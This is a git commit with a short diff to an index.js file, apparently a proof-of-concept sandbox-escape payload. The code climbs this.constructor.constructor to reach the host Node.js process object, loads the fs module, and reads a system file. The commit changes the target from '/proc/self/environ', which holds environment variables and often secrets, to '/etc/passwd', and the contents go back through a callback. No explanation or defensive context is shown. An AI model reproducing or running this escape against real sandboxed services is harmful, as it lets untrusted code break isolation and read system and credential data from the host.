3a27117e533a960efb2a60178bf05efd8657ade5
nileninja <156793196+nileninja-1@users.noreply.github.com>
2026-02-05 13:59:38 +0300

    Change file read from '/proc/self/environ' to '/etc/passwd'

--- index.js
+++ index.js
@@ -3,7 +3,7 @@ const globalFunc = this.constructor.constructor;
 const hostProcess = globalFunc('return process')();
 
 const fs = hostProcess.mainModule.require('fs');
-const secret = fs.readFileSync('/proc/self/environ', 'utf8');
+const secret = fs.readFileSync('/etc/passwd', 'utf8');
 
 module.exports = function (cb) {
     cb(null, `Output: ${secret}`)
